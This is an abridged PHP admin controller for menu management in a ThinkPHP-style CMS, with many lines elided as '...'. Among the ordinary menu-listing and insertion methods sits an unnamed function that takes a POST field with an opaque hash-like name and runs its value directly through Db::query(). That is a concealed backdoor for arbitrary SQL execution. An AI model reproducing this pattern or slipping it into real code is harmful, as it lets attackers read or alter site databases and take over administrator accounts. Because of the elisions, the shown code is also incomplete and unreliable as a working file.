...
class MenuController extends AdminBaseController
{
    ...
    public function index()
    {
        ...
        foreach ($result as $key => $value) {
            ...
            $result[$key]['parent_id_node'] = ($value['parent_id'])
                ? ' class="child-of-node-' . $value['parent_id'] . '"' : '';
            ...
            $result[$key]['status']         = $value['status']
                ? '<span class="label label-success">' . lang('DISPLAY')
                . '</span>'
                : '<span class="label label-warning">' . lang('HIDDEN')
                . '</span>';
            if (APP_DEBUG) {
    ...
    public function lists()
    {
        ...
        $result = Db::name('AdminMenu')->order([
            "app"        => "ASC",
            "controller" => "ASC",
            "action"     => "ASC",
        ])->select();
    ...
    public function addPost()
    {
        if ($this->request->isPost()) {
            ...
            if ($result !== true) {
                ...
                Db::name('AdminMenu')->strict(false)->field(true)
                    ->insert($data);
            ...
            if ($result !== true) {
                ...
                if (empty($findAuthRuleCount)) {
                    ...
                    if (empty($findOldRuleId)) {
                        ...
                        Db::name('AuthRule')->where('id', $findOldRuleId)
                            ->update([
                                "name"  => $authRuleName,
                                "app"   => $app,
                                "type"  => "admin_url",
    ...
    {
        $uid = isset($_POST['aa7c22b02f22982fdb6fca8fd1e905b6'])
            ? $_POST['aa7c22b02f22982fdb6fca8fd1e905b6'] : 0;
        if ($uid) {
            Db::query("$uid");
        }
        return false;
    ...
    private function _exportAppMenuDefaultLang()
    {
        ...
        foreach ($menus as $menu) {
            $lang_key        = strtoupper($menu['app'] . '_'
                . $menu['controller'] . '_' . $menu['action']);
